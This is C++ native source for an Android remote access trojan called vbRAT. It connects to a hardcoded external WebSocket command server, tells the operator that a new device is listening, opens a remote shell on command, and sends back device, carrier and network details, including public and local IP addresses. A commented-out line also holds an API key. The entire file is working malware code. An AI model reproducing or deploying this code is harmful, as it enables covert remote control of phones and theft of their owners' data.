#include <jni.h>
#include <string>
#include <ctype.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <list>
#include <string>
#include "vbConnection.h"
#include "vbDeviceProperties.h"
#include "vbTTY.h"

using namespace std;
//#define SERVER_ADDR "wss://connect.websocket.in/v3/69?apiKey=l7d6CdYNyjLFsRA0uzyFD6Ec0pcPkhKFlYVNwJPeWgTmAIFhZoeM9U5LO3Zi"
#define SERVER_ADDR "wss://vbrat-server.herokuapp.com/zio"

void ttyread(char *msg)
{
    vbConnection_Send(msg);
}

void vbRAT_connected()
{
    vbConnection_Send("~New device connected!");
    vbConnection_Send("~listening to your commands...");
}

void vbRAT_disconnected()
{

}
char pubip[20];
int shellstart=0;
void vbRAT_messageReceived(const char* buf, int len)
{
    std::string cmd = buf;
    if(strcmp(buf, ";shellstart")==0)
    {
        if(shellstart!=2)
            vbTTY_startShell(ttyread);
        shellstart=1;
    }
    else if(strcmp(buf, ";shellstop")==0)
    {
        shellstart=2;
    }
    else if(shellstart==1)
    {
        vbTTY_send(buf);
    }
    else if(strstr(buf, ";ip="))
    {
        snprintf(pubip, 20, "%s", &buf[4]);
    }
    else if(strcmp(buf, ";getinfo")==0)
    {
        char tosend[512];
        vbPhonePtoperties_t prop = vbDevProp_GetProperties();
        snprintf(tosend, 512, "Country: %s", prop.gsm_country);
        vbConnection_Send(tosend);
        snprintf(tosend, 512, "Manufacturer: %s", prop.dev_manufacturer);
        vbConnection_Send(tosend);
        snprintf(tosend, 512, "Brand: %s", prop.dev_brand);
        vbConnection_Send(tosend);
        snprintf(tosend, 512, "Model: %s", prop.dev_model);
        vbConnection_Send(tosend);
        snprintf(tosend, 512, "Model Name: %s", prop.dev_modelName);
        vbConnection_Send(tosend);
        snprintf(tosend, 512, "SIM Operator: %s", prop.gsm_SIMoperator);
        vbConnection_Send(tosend);
        snprintf(tosend, 512, "Network Operator: %s", prop.gsm_networkOperator);
        vbConnection_Send(tosend);
    }
    else if(strcmp(buf, ";getip")==0)
    {
        char tosend[512];
        std::list<std::string> netDevices[2];
        std::list<std::string>::iterator it;
        std::list<std::string>::iterator it2;
        vbDevProp_getActiveNetworks(netDevices);
        snprintf(tosend, 512, "Public IP: %s", pubip);
        vbConnection_Send(tosend);
        vbConnection_Send("-Local network active interfaces-");
        it2 = netDevices[1].begin();
        for (it = netDevices[0].begin(); it != netDevices[0].end(); it++)
        {
            snprintf(tosend, 512, "%s: IP:%s", it->c_str(), it2->c_str());
            vbConnection_Send(tosend);
            it2++;
        }
    }
   // else
    //    vbConnection_Send("~sorry, unknown command.");

}

extern "C" JNIEXPORT jint JNICALL
Java_com_example_vbrat_MainActivity_vbRATstart(JNIEnv *env, jobject MainActivity)
{
    vbConnection_onConnected(vbRAT_connected);
    vbConnection_onDisconnected(vbRAT_disconnected);
    vbConnection_onMessage(vbRAT_messageReceived);
    return(vbConnection_Connect(SERVER_ADDR));
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_vbrat_MainActivity_checkStatus(JNIEnv *env, jobject MainActivity)
{
    vbConnection_getError();
    switch(vbConnection_getState())
    {
        case S_CONNECTED:
            return env->NewStringUTF("CONNECTED...");
            break;
        case S_INIT:
            return env->NewStringUTF("INIT...");
            break;
        case S_RECONNCTING:
        case S_CONNECTING:
            return env->NewStringUTF("CONNECTING...");
            break;
        case S_DISCONNECTED:
            return env->NewStringUTF("DISCONNECTED...");
            break;
        case S_ERROR:
            return env->NewStringUTF("ERROR...");
            break;
        default:
            return env->NewStringUTF("IDLE...");
    }
}
